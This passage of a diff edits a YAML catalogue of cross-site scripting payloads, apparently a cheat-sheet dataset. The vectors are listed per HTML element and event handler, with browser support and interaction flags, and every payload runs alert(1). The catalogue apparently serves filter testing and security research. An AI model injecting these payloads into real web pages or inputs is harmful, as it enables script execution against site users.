   onfocus:
     payloads:
     - <form id=x tabindex=1 onfocus=alert(1)></form>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2930,7 +2597,6 @@ form:
   onfocusin:
     payloads:
     - <form id=x tabindex=1 onfocusin=alert(1)></form>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2938,7 +2604,6 @@ form:
   onpaste:
     payloads:
     - <form onpaste="alert(1)" contenteditable>test</form>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2947,7 +2612,6 @@ form:
   onreset:
     payloads:
     - <form onreset=alert(1)><input type=reset>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2956,7 +2620,6 @@ form:
   onsubmit:
     payloads:
     - <form onsubmit=alert(1)><input type=submit>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2966,7 +2629,6 @@ frame:
   onbeforecopy:
     payloads:
     - <frame onbeforecopy="alert(1)" contenteditable>test</frame>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2975,7 +2637,6 @@ frame:
   onbeforecut:
     payloads:
     - <frame onbeforecut="alert(1)" contenteditable>test</frame>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2984,21 +2645,18 @@ frame:
   onfocus:
     payloads:
     - <frameset><frame id=x onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
   onfocusin:
     payloads:
     - <frameset><frame id=x onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
   onload:
     payloads:
     - <frameset><frame onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3007,7 +2665,6 @@ frame:
   onpaste:
     payloads:
     - <frame onpaste="alert(1)" contenteditable>test</frame>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3017,7 +2674,6 @@ frameset:
   onbeforecopy:
     payloads:
     - <frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3026,7 +2682,6 @@ frameset:
   onbeforecut:
     payloads:
     - <frameset onbeforecut="alert(1)" contenteditable>test</frameset>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3035,7 +2690,6 @@ frameset:
   onfocus:
     payloads:
     - <frameset id=x tabindex=1 onfocus=alert(1)></frameset>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3043,7 +2697,6 @@ frameset:
   onfocusin:
     payloads:
     - <frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3051,7 +2704,6 @@ frameset:
   onpageshow:
     payloads:
     - <frameset onpageshow=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3060,7 +2712,6 @@ frameset:
   onpaste:
     payloads:
     - <frameset onpaste="alert(1)" contenteditable>test</frameset>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3070,7 +2721,6 @@ h1:
   onbeforecopy:
     payloads:
     - <h1 onbeforecopy="alert(1)" contenteditable>test</h1>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3079,7 +2729,6 @@ h1:
   onbeforecut:
     payloads:
     - <h1 onbeforecut="alert(1)" contenteditable>test</h1>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3088,7 +2737,6 @@ h1:
   onfocus:
     payloads:
     - <h1 id=x tabindex=1 onfocus=alert(1)></h1>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3096,7 +2744,6 @@ h1:
   onfocusin:
     payloads:
     - <h1 id=x tabindex=1 onfocusin=alert(1)></h1>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3104,7 +2751,6 @@ h1:
   onpaste:
     payloads:
     - <h1 onpaste="alert(1)" contenteditable>test</h1>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3114,7 +2760,6 @@ head:
   onbeforecopy:
     payloads:
     - <head onbeforecopy="alert(1)" contenteditable style=display:block>test</head>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3123,7 +2768,6 @@ head:
   onbeforecut:
     payloads:
     - <head onbeforecut="alert(1)" contenteditable style=display:block>test</head>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3132,7 +2776,6 @@ head:
   onfocus:
     payloads:
     - <head id=x tabindex=1 onfocus=alert(1) style=display:block></head>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3140,7 +2783,6 @@ head:
   onfocusin:
     payloads:
     - <head id=x tabindex=1 onfocusin=alert(1) style=display:block></head>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3148,7 +2790,6 @@ head:
   onpaste:
     payloads:
     - <head onpaste="alert(1)" contenteditable style=display:block>test</head>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3158,7 +2799,6 @@ header:
   onbeforecopy:
     payloads:
     - <header onbeforecopy="alert(1)" contenteditable>test</header>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3167,7 +2807,6 @@ header:
   onbeforecut:
     payloads:
     - <header onbeforecut="alert(1)" contenteditable>test</header>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3176,7 +2815,6 @@ header:
   onfocus:
     payloads:
     - <header id=x tabindex=1 onfocus=alert(1)></header>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3184,7 +2822,6 @@ header:
   onfocusin:
     payloads:
     - <header id=x tabindex=1 onfocusin=alert(1)></header>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3192,7 +2829,6 @@ header:
   onpaste:
     payloads:
     - <header onpaste="alert(1)" contenteditable>test</header>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3202,7 +2838,6 @@ hgroup:
   onbeforecopy:
     payloads:
     - <hgroup onbeforecopy="alert(1)" contenteditable>test</hgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3211,7 +2846,6 @@ hgroup:
   onbeforecut:
     payloads:
     - <hgroup onbeforecut="alert(1)" contenteditable>test</hgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3220,7 +2854,6 @@ hgroup:
   onfocus:
     payloads:
     - <hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3228,7 +2861,6 @@ hgroup:
   onfocusin:
     payloads:
     - <hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3236,7 +2868,6 @@ hgroup:
   onpaste:
     payloads:
     - <hgroup onpaste="alert(1)" contenteditable>test</hgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3246,7 +2877,6 @@ hr:
   onbeforecopy:
     payloads:
     - <hr onbeforecopy="alert(1)" contenteditable>test</hr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3255,7 +2885,6 @@ hr:
   onbeforecut:
     payloads:
     - <hr onbeforecut="alert(1)" contenteditable>test</hr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3264,7 +2893,6 @@ hr:
   onfocus:
     payloads:
     - <hr id=x tabindex=1 onfocus=alert(1)></hr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3272,7 +2900,6 @@ hr:
   onfocusin:
     payloads:
     - <hr id=x tabindex=1 onfocusin=alert(1)></hr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3280,7 +2907,6 @@ hr:
   onpaste:
     payloads:
     - <hr onpaste="alert(1)" contenteditable>test</hr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3290,7 +2916,6 @@ html:
   onbeforecopy:
     payloads:
     - <html onbeforecopy="alert(1)" contenteditable>test</html>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3299,7 +2924,6 @@ html:
   onbeforecut:
     payloads:
     - <html onbeforecut="alert(1)" contenteditable>test</html>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3308,7 +2932,6 @@ html:
   onfocus:
     payloads:
     - <html id=x tabindex=1 onfocus=alert(1)></html>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3316,7 +2939,6 @@ html:
   onfocusin:
     payloads:
     - <html id=x tabindex=1 onfocusin=alert(1)></html>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3324,7 +2946,6 @@ html:
   onpaste:
     payloads:
     - <html onpaste="alert(1)" contenteditable>test</html>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3334,7 +2955,6 @@ i:
   onbeforecopy:
     payloads:
     - <i onbeforecopy="alert(1)" contenteditable>test</i>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3343,7 +2963,6 @@ i:
   onbeforecut:
     payloads:
     - <i onbeforecut="alert(1)" contenteditable>test</i>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3352,7 +2971,6 @@ i:
   onfocus:
     payloads:
     - <i id=x tabindex=1 onfocus=alert(1)></i>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3360,7 +2978,6 @@ i:
   onfocusin:
     payloads:
     - <i id=x tabindex=1 onfocusin=alert(1)></i>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3368,7 +2985,6 @@ i:
   onpaste:
     payloads:
     - <i onpaste="alert(1)" contenteditable>test</i>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3378,7 +2994,6 @@ iframe:
   onbeforecopy:
     payloads:
     - <iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3387,7 +3002,6 @@ iframe:
   onbeforecut:
     payloads:
     - <iframe onbeforecut="alert(1)" contenteditable>test</iframe>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3396,21 +3010,18 @@ iframe:
   onfocus:
     payloads:
     - <iframe id=x onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
   onfocusin:
     payloads:
     - <iframe id=x onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
   onload:
     payloads:
     - <iframe onload=alert(1)></iframe>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3419,7 +3030,6 @@ iframe:
   onpaste:
     payloads:
     - <iframe onpaste="alert(1)" contenteditable>test</iframe>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3429,14 +3039,12 @@ iframe2:
   onfocus:
     payloads:
     - <iframe autofocus onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
   onfocusin:
     payloads:
     - <iframe autofocus onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3444,7 +3052,6 @@ image:
   onbeforecopy:
     payloads:
     - <image onbeforecopy="alert(1)" contenteditable>test</image>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3453,7 +3060,6 @@ image:
   onbeforecut:
     payloads:
     - <image onbeforecut="alert(1)" contenteditable>test</image>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3462,7 +3068,6 @@ image:
   onerror:
     payloads:
     - <image src/onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3471,7 +3076,6 @@ image:
   onfocus:
     payloads:
     - <image id=x tabindex=1 onfocus=alert(1)></image>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3479,7 +3083,6 @@ image:
   onfocusin:
     payloads:
     - <image id=x tabindex=1 onfocusin=alert(1)></image>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3487,7 +3090,6 @@ image:
   onload:
     payloads:
     - <image src=validimage.png onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3496,21 +3098,18 @@ image:
   onloadend:
     payloads:
     - <image src=validimage.png onloadend=alert(1)>
-    required: []
     interaction: false
     browsers:
     - firefox
   onloadstart:
     payloads:
     - <image src=validimage.png onloadstart=alert(1)>
-    required: []
     interaction: false
     browsers:
     - firefox
   onpaste:
     payloads:
     - <image onpaste="alert(1)" contenteditable>test</image>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3520,7 +3119,6 @@ image2:
   onerror:
     payloads:
     - <image srcset=1 onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3529,7 +3127,6 @@ image2:
   onload:
     payloads:
     - <picture><source srcset="validimage.png"><image onload=alert(1)></picture>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3538,14 +3135,12 @@ image2:
   onloadend:
     payloads:
     - <picture><source srcset="validimage.png"><image onloadend=alert(1)></picture>
-    required: []
     interaction: false
     browsers:
     - firefox
   onloadstart:
     payloads:
     - <picture><source srcset="validimage.png"><image onloadstart=alert(1)></picture>
-    required: []
     interaction: false
     browsers:
     - firefox
@@ -3553,7 +3148,6 @@ image3:
   onerror:
     payloads:
     - <svg><image href=1 onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3562,7 +3156,6 @@ image3:
   onload:
     payloads:
     - <svg><image href=validimage.png onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3572,7 +3165,6 @@ img:
   onbeforecopy:
     payloads:
     - <img onbeforecopy="alert(1)" contenteditable>test</img>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3581,7 +3173,6 @@ img:
   onbeforecut:
     payloads:
     - <img onbeforecut="alert(1)" contenteditable>test</img>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3590,7 +3181,6 @@ img:
   onerror:
     payloads:
     - <img src/onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3599,7 +3189,6 @@ img:
   onfocus:
     payloads:
     - <img id=x tabindex=1 onfocus=alert(1)></img>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3607,7 +3196,6 @@ img:
   onfocusin:
     payloads:
     - <img id=x tabindex=1 onfocusin=alert(1)></img>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3615,7 +3203,6 @@ img:
   onload:
     payloads:
     - <img src=validimage.png onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3624,21 +3211,18 @@ img:
   onloadend:
     payloads:
     - <img src=validimage.png onloadend=alert(1)>
-    required: []
     interaction: false
     browsers:
     - firefox
   onloadstart:
     payloads:
     - <img src=validimage.png onloadstart=alert(1)>
-    required: []
     interaction: false
     browsers:
     - firefox
   onpaste:
     payloads:
     - <img onpaste="alert(1)" contenteditable>test</img>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3648,7 +3232,6 @@ img2:
   onerror:
     payloads:
     - <img srcset=1 onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3657,7 +3240,6 @@ img2:
   onload:
     payloads:
     - <img srcset=validimage.png onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3666,14 +3248,12 @@ img2:
   onloadend:
     payloads:
     - <picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
-    required: []
     interaction: false
     browsers:
     - firefox
   onloadstart:
     payloads:
     - <picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
-    required: []
     interaction: false
     browsers:
     - firefox
@@ -3681,7 +3261,6 @@ input:
   onauxclick:
     payloads:
     - <input onauxclick=alert(1)>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3689,7 +3268,6 @@ input:
   onbeforecopy:
     payloads:
     - <input onbeforecopy=alert(1) value="XSS" autofocus>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3698,7 +3276,6 @@ input:
   onbeforecut:
     payloads:
     - <input onbeforecut=alert(1) value="XSS" autofocus>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3707,7 +3284,6 @@ input:
   onchange:
     payloads:
     - <input onchange=alert(1) value=xss>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3716,7 +3292,6 @@ input:
   onerror:
     payloads:
     - <input type=image src=1 onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3725,7 +3300,6 @@ input:
   onfocus:
     payloads:
     - <input autofocus onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3734,7 +3308,6 @@ input:
   onfocusin:
     payloads:
     - <input autofocus onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3743,7 +3316,6 @@ input:
   oninput:
     payloads:
     - <input oninput=alert(1) value=xss>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3751,8 +3323,6 @@ input:
     - safari
   oninvalid:
     payloads:
-    - <form><input oninvalid=alert(1) required><input type=submit>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3761,7 +3331,6 @@ input:
   onload:
     payloads:
     - <input type=image src=validimage.png onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3770,21 +3339,18 @@ input:
   onloadend:
     payloads:
     - <input type=image onloadend=alert(1) src=validimage.png>
-    required: []
     interaction: false
     browsers:
     - firefox
   onloadstart:
     payloads:
     - <input type=image onloadstart=alert(1) src=validimage.png>
-    required: []
     interaction: false
     browsers:
     - firefox
   onpaste:
     payloads:
     - <input onpaste=alert(1) value="" autofocus>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3793,14 +3359,12 @@ input:
   onsearch:
     payloads:
     - <form><input type=search onsearch=alert(1) value="Hit return" autofocus>
-    required: []
     interaction: true
     browsers:
     - chrome
   onselect:
     payloads:
     - <input onselect=alert(1) value="XSS" autofocus>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3810,7 +3374,6 @@ input2:
   onfocus:
     payloads:
     - <input id=x onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3818,7 +3381,6 @@ input2:
   onfocusin:
     payloads:
     - <input id=x onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3827,7 +3389,6 @@ input3:
   onfocus:
     payloads:
     - <input type=checkbox id=x onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3835,7 +3396,6 @@ input3:
   onfocusin:
     payloads:
     - <input type=checkbox id=x onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3844,7 +3404,6 @@ input4:
   onfocus:
     payloads:
     - <input type=radio id=x onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3852,7 +3411,6 @@ input4:
   onfocusin:
     payloads:
     - <input type=radio id=x onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3861,7 +3419,6 @@ ins:
   onbeforecopy:
     payloads:
     - <ins onbeforecopy="alert(1)" contenteditable>test</ins>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3870,7 +3427,6 @@ ins:
   onbeforecut:
     payloads:
     - <ins onbeforecut="alert(1)" contenteditable>test</ins>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3879,7 +3435,6 @@ ins:
   onfocus:
     payloads:
     - <ins id=x tabindex=1 onfocus=alert(1)></ins>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3887,7 +3442,6 @@ ins:
   onfocusin:
     payloads:
     - <ins id=x tabindex=1 onfocusin=alert(1)></ins>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3895,7 +3449,6 @@ ins:
   onpaste:
     payloads:
     - <ins onpaste="alert(1)" contenteditable>test</ins>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3905,7 +3458,6 @@ kbd:
   onbeforecopy:
     payloads:
     - <kbd onbeforecopy="alert(1)" contenteditable>test</kbd>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3914,7 +3466,6 @@ kbd:
   onbeforecut:
     payloads:
     - <kbd onbeforecut="alert(1)" contenteditable>test</kbd>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3923,7 +3474,6 @@ kbd:
   onfocus:
     payloads:
     - <kbd id=x tabindex=1 onfocus=alert(1)></kbd>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3931,7 +3481,6 @@ kbd:
   onfocusin:
     payloads:
     - <kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -3939,7 +3488,6 @@ kbd:
   onpaste:
     payloads:
     - <kbd onpaste="alert(1)" contenteditable>test</kbd>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3949,7 +3497,6 @@ keygen:
   onbeforecopy:
     payloads:
     - <keygen onbeforecopy="alert(1)" contenteditable>test</keygen>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3958,7 +3505,6 @@ keygen:
   onbeforecut:
     payloads:
     - <keygen onbeforecut="alert(1)" contenteditable>test</keygen>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3967,7 +3513,6 @@ keygen:
   onfocus:
     payloads:
     - <keygen autofocus onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - firefox
@@ -3975,7 +3520,6 @@ keygen:
   onfocusin:
     payloads:
     - <keygen autofocus onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - firefox
@@ -3983,7 +3527,6 @@ keygen:
   onpaste:
     payloads:
     - <keygen onpaste="alert(1)" contenteditable>test</keygen>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -3993,7 +3536,6 @@ label:
   onbeforecopy:
     payloads:
     - <label onbeforecopy="alert(1)" contenteditable>test</label>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4002,7 +3544,6 @@ label:
   onbeforecut:
     payloads:
     - <label onbeforecut="alert(1)" contenteditable>test</label>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4011,7 +3552,6 @@ label:
   onfocus:
     payloads:
     - <label id=x tabindex=1 onfocus=alert(1)></label>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4019,7 +3559,6 @@ label:
   onfocusin:
     payloads:
     - <label id=x tabindex=1 onfocusin=alert(1)></label>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4027,7 +3566,6 @@ label:
   onpaste:
     payloads:
     - <label onpaste="alert(1)" contenteditable>test</label>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4037,7 +3575,6 @@ legend:
   onbeforecopy:
     payloads:
     - <legend onbeforecopy="alert(1)" contenteditable>test</legend>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4046,7 +3583,6 @@ legend:
   onbeforecut:
     payloads:
     - <legend onbeforecut="alert(1)" contenteditable>test</legend>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4055,7 +3591,6 @@ legend:
   onfocus:
     payloads:
     - <legend id=x tabindex=1 onfocus=alert(1)></legend>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4063,7 +3598,6 @@ legend:
   onfocusin:
     payloads:
     - <legend id=x tabindex=1 onfocusin=alert(1)></legend>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4071,7 +3605,6 @@ legend:
   onpaste:
     payloads:
     - <legend onpaste="alert(1)" contenteditable>test</legend>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4081,7 +3614,6 @@ li:
   onbeforecopy:
     payloads:
     - <li onbeforecopy="alert(1)" contenteditable>test</li>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4090,7 +3622,6 @@ li:
   onbeforecut:
     payloads:
     - <li onbeforecut="alert(1)" contenteditable>test</li>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4099,7 +3630,6 @@ li:
   onfocus:
     payloads:
     - <li id=x tabindex=1 onfocus=alert(1)></li>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4107,7 +3637,6 @@ li:
   onfocusin:
     payloads:
     - <li id=x tabindex=1 onfocusin=alert(1)></li>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4115,7 +3644,6 @@ li:
   onpaste:
     payloads:
     - <li onpaste="alert(1)" contenteditable>test</li>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4125,7 +3653,6 @@ link:
   onerror:
     payloads:
     - <link rel=stylesheet href=1 onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4134,7 +3661,6 @@ link:
   onfocus:
     payloads:
     - <link onfocus=alert(1) id=x tabindex=1 style=display:block>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4142,7 +3668,6 @@ link:
   onfocusin:
     payloads:
     - <link onfocusin=alert(1) id=x tabindex=1 style=display:block>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4150,7 +3675,6 @@ link:
   onload:
     payloads:
     - <link href=validstyles.css rel=stylesheet onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4160,7 +3684,6 @@ listing:
   onbeforecopy:
     payloads:
     - <listing onbeforecopy="alert(1)" contenteditable>test</listing>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4169,7 +3692,6 @@ listing:
   onbeforecut:
     payloads:
     - <listing onbeforecut="alert(1)" contenteditable>test</listing>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4178,7 +3700,6 @@ listing:
   onfocus:
     payloads:
     - <listing id=x tabindex=1 onfocus=alert(1)></listing>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4186,7 +3707,6 @@ listing:
   onfocusin:
     payloads:
     - <listing id=x tabindex=1 onfocusin=alert(1)></listing>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4194,7 +3714,6 @@ listing:
   onpaste:
     payloads:
     - <listing onpaste="alert(1)" contenteditable>test</listing>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4204,7 +3723,6 @@ main:
   onbeforecopy:
     payloads:
     - <main onbeforecopy="alert(1)" contenteditable>test</main>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4213,7 +3731,6 @@ main:
   onbeforecut:
     payloads:
     - <main onbeforecut="alert(1)" contenteditable>test</main>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4222,7 +3739,6 @@ main:
   onfocus:
     payloads:
     - <main id=x tabindex=1 onfocus=alert(1)></main>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4230,7 +3746,6 @@ main:
   onfocusin:
     payloads:
     - <main id=x tabindex=1 onfocusin=alert(1)></main>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4238,7 +3753,6 @@ main:
   onpaste:
     payloads:
     - <main onpaste="alert(1)" contenteditable>test</main>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4248,7 +3762,6 @@ map:
   onbeforecopy:
     payloads:
     - <map onbeforecopy="alert(1)" contenteditable>test</map>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4257,7 +3770,6 @@ map:
   onbeforecut:
     payloads:
     - <map onbeforecut="alert(1)" contenteditable>test</map>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4266,7 +3778,6 @@ map:
   onfocus:
     payloads:
     - <map id=x tabindex=1 onfocus=alert(1)></map>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4274,7 +3785,6 @@ map:
   onfocusin:
     payloads:
     - <map id=x tabindex=1 onfocusin=alert(1)></map>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4282,7 +3792,6 @@ map:
   onpaste:
     payloads:
     - <map onpaste="alert(1)" contenteditable>test</map>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4292,7 +3801,6 @@ mark:
   onbeforecopy:
     payloads:
     - <mark onbeforecopy="alert(1)" contenteditable>test</mark>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4301,7 +3809,6 @@ mark:
   onbeforecut:
     payloads:
     - <mark onbeforecut="alert(1)" contenteditable>test</mark>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4310,7 +3817,6 @@ mark:
   onfocus:
     payloads:
     - <mark id=x tabindex=1 onfocus=alert(1)></mark>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4318,7 +3824,6 @@ mark:
   onfocusin:
     payloads:
     - <mark id=x tabindex=1 onfocusin=alert(1)></mark>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4326,7 +3831,6 @@ mark:
   onpaste:
     payloads:
     - <mark onpaste="alert(1)" contenteditable>test</mark>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4336,7 +3840,6 @@ marquee:
   onbeforecopy:
     payloads:
     - <marquee onbeforecopy="alert(1)" contenteditable>test</marquee>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4345,7 +3848,6 @@ marquee:
   onbeforecut:
     payloads:
     - <marquee onbeforecut="alert(1)" contenteditable>test</marquee>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4354,21 +3856,18 @@ marquee:
   onbounce:
     payloads:
     - <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
-    required: []
     interaction: false
     browsers:
     - firefox
   onfinish:
     payloads:
     - <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
-    required: []
     interaction: false
     browsers:
     - firefox
   onfocus:
     payloads:
     - <marquee id=x tabindex=1 onfocus=alert(1)></marquee>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4376,7 +3875,6 @@ marquee:
   onfocusin:
     payloads:
     - <marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4384,7 +3882,6 @@ marquee:
   onpaste:
     payloads:
     - <marquee onpaste="alert(1)" contenteditable>test</marquee>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4393,7 +3890,6 @@ marquee:
   onstart:
     payloads:
     - <marquee onstart=alert(1)>XSS</marquee>
-    required: []
     interaction: false
     browsers:
     - firefox
@@ -4401,7 +3897,6 @@ menu:
   onbeforecopy:
     payloads:
     - <menu onbeforecopy="alert(1)" contenteditable>test</menu>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4410,7 +3905,6 @@ menu:
   onbeforecut:
     payloads:
     - <menu onbeforecut="alert(1)" contenteditable>test</menu>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4419,7 +3913,6 @@ menu:
   onfocus:
     payloads:
